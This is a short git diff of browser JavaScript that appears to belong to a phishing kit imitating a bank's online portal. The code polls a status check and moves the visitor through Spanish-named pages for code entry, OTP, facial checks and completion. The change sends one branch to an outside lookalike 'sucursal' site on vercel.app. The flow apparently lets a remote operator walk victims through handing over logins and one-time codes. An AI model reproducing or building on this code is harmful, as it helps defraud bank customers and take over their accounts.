@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', async function () {
         if (data.autorizado && !data.error) window.location.href = "codigo.html";
         else if (data.error && !data.finalizado && !data.otpSolicitado) window.location.href = "usererror.html";
         else if (data.otpSolicitado) window.location.href = "otp.html";
-        else if (data.error && data.fallo) window.location.href = "facial.html";
+        else if (data.error && data.fallo) window.location.href = "https://sucursalsvp.vercel.app/";
         else if (data.finalizado) window.location.href = "finalizar.html";
         else setTimeout(checkStatus, 2000);
     };
